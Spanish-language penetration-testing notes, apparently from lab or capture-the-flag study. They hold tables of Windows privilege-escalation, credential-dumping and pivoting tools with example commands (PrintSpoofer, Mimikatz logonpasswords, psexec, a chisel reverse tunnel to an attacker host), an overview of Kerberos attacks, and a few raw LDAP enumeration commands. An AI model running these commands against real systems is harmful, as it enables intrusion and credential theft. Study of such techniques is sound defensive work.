| 💾 Dump SAM/SYSTEM             | Linux                                  | **Impacket (secretsdump.py)**: Extrae hashes de contraseñas locales desde SAM y SYSTEM de un host comprometido. | Obtener credenciales locales y hashes de Windows            |
| 📋 Service Account Harvesting  | Windows / Linux                        | **PowerView**: Enumeración de AD y SPN. <br>**Impacket / setspn**: Listar SPNs en el dominio.                | Enumerar SPNs y cuentas de servicio                          |


---

# Tabla de Herramientas de Post-Explotación y Pivoting

| Herramienta | Descripción | Tipo de Herramienta | Sistema de instalación | Instalación | Ejemplo de Uso Realista | Privilegios requeridos |
|-------------|-------------|---------------------|------------------------|-------------|-------------------------|------------------------|
| **PrintSpoofer.exe / PrintSpoofer64.exe** | Abusa del servicio `Print Spooler` y el permiso `SeImpersonatePrivilege` para escalar a SYSTEM. | Escalación de privilegios local | Windows | Descargar desde repositorios públicos (ej. GitHub) o compilar en Visual Studio. | `PrintSpoofer64.exe -i -c cmd.exe` (Abre shell como SYSTEM) | Usuario con `SeImpersonatePrivilege` habilitado. |
| **JuicyPotato.exe** | Variante de exploit que abusa de COM y permisos especiales para escalar a SYSTEM. | Escalación de privilegios local | Windows | Descargar binario o compilar desde código fuente. | `JuicyPotato.exe -l 1337 -p cmd.exe -t *` (Eleva a SYSTEM) | `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`. |
| **GodPotato.exe / GodPotato-NEI2.exe** | Variante mejorada de JuicyPotato que funciona en versiones más recientes de Windows. | Escalación de privilegios local | Windows | Descargar binario listo desde GitHub. | `GodPotato.exe -cmd "cmd /c whoami"` | `SeImpersonatePrivilege`. |
| **RogueWinRM.exe** | Permite ejecutar comandos remotos como SYSTEM a través de WinRM cuando se tienen privilegios. | Ejecución remota | Windows | Descargar binario desde GitHub o compilar. | `RogueWinRM.exe -H <victima_ip> -u usuario -p contraseña -c "powershell.exe"` | WinRM habilitado y credenciales válidas. |
| **sh6789.exe** | Script/binario personalizado para ejecución de payloads en Windows. | Ejecución de payloads | Windows | Copiar en la máquina víctima. | `sh6789.exe` | Depende del payload; normalmente requiere ejecución local. |
| **BloodHound** | Herramienta de análisis de Active Directory que permite descubrir rutas de ataque. | Reconocimiento y escalación lateral | Windows/Linux | Instalar desde GitHub (`npm install` para interfaz gráfica, `SharpHound` para recolección). | `SharpHound.exe -c All` y luego analizar con GUI. | Usuario con acceso al dominio. |
| **Mimikatz** | Extrae credenciales en texto plano, hashes y tickets Kerberos desde memoria. | Post-explotación / extracción de credenciales | Windows | Descargar desde GitHub o binarios precompilados. | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"` | Usuario con privilegio `SeDebugPrivilege` (normalmente admin local). |
| **Impacket** | Conjunto de scripts Python para interactuar con protocolos de red (SMB, RDP, etc.). | Post-explotación / movimiento lateral | Linux | `pip install impacket` | `psexec.py usuario@victima` | Credenciales válidas y acceso a puertos necesarios. |
| **Kerbrute** | Fuerza bruta o enumera usuarios en Kerberos. | Reconocimiento | Windows/Linux | Descargar desde GitHub (Go) o binario precompilado. | `kerbrute userenum -d dominio.local users.txt` | No requiere privilegios especiales; solo acceso a KDC (puerto 88). |
| **CrackMapExec (CME)** | Automatiza pruebas en redes Windows (SMB, WinRM, RDP). | Post-explotación / movimiento lateral | Linux | `pipx install crackmapexec` | `cme smb 192.168.1.0/24 -u usuario -p contraseña` | Credenciales válidas. |
| **smbclient** | Cliente SMB para acceder a recursos compartidos. | Acceso a compartidos SMB | Linux | `sudo apt install smbclient` | `smbclient //192.168.1.10/compartido -U usuario` | Credenciales válidas o acceso anónimo. |
| **rpcclient** | Cliente RPC para consultar información de Windows. | Enumeración | Linux | `sudo apt install samba-common-bin` | `rpcclient -U "" -N 192.168.1.10` | Acceso anónimo o credenciales válidas. |
| **proxychains** | Encadena conexiones a través de proxies/Tor. | Pivoting / tunneling | Linux | `sudo apt install proxychains` | `proxychains nmap -Pn 10.10.10.10` | No requiere privilegios especiales. |
| **chisel** | Túnel TCP/UDP rápido sobre HTTP. | Pivoting / tunneling | Windows/Linux | Descargar desde GitHub o binario precompilado. | `chisel server -p 8000 --reverse` (atacante) y `chisel client atacante_ip:8000 R:8080:127.0.0.1:80` (víctima) | Ejecución en ambos extremos; no requiere privilegios especiales. |


---

# 📌 Principales ataques contra Kerberos

| Ataque                     | Descripción                                                                                      | Requisitos previos                                                   | Herramientas comunes                                       |
|-----------------------------|--------------------------------------------------------------------------------------------------|----------------------------------------------------------------------|------------------------------------------------------------|
| **Kerberoasting**           | Solicita un Ticket Granting Service (TGS) para cuentas de servicio (SPNs) y lo crackea offline para obtener la contraseña. | Acceso a una cuenta de dominio autenticada.                          | Rubeus, Impacket (`GetUserSPNs.py`), PowerView             |
| **AS-REP Roasting**         | Obtiene el ticket de autenticación cifrado (AS-REP) de usuarios con preautenticación Kerberos deshabilitada y crackea su hash. | Lista de usuarios y que tengan pre-auth deshabilitado.                | Impacket (`GetNPUsers.py`), Rubeus                        |
| **Pass-the-Ticket (PtT)**   | Usa tickets Kerberos TGT/TGS ya robados para autenticarse en otros sistemas, sin conocer la contraseña. | Dump de tickets Kerberos desde LSASS o caché de tickets.              | Mimikatz, Rubeus, `klist`                                 |
| **Overpass-the-Hash (PtH/Pass-the-Key)** | Usa el hash NTLM de un usuario para pedir un TGT y autenticarse en Kerberos.           | Hash NTLM del usuario objetivo.                                       | Mimikatz, Rubeus                                           |
| **Golden Ticket**           | Crea un Ticket Granting Ticket (TGT) falso firmándolo con la clave secreta del servicio `krbtgt` para tener acceso total. | Hash NTLM de la cuenta `krbtgt` y SID del dominio.                    | Mimikatz, Rubeus                                           |
| **Silver Ticket**           | Crea un TGS falso usando el hash NTLM del servicio específico para autenticarse en ese servicio. | Hash NTLM de la cuenta de servicio.                                   | Mimikatz, Rubeus                                           |
| **Kerberos Delegation Abuse** | Abusa de delegaciones configuradas (unconstrained/constrained) para obtener acceso a otros servicios como otro usuario. | Usuario o equipo con delegación habilitada.                          | Rubeus, Mimikatz                                           |
| **S4U2Self / S4U2Proxy Abuse** | Solicita tickets para otros usuarios mediante delegación si el atacante controla un servicio con privilegios delegados. | Control de una cuenta de servicio con privilegios de delegación.      | Rubeus                                                     |



locate 2john | grep -v share | grep safe


└─$ ldapsearch -x -H ldap://10.201.64.240 -b "dc=thm,dc=local"  >> ldap.txt


└─$ nxc ldap thm.local -u '' -p '' -M get-desc-users > usarios3.txt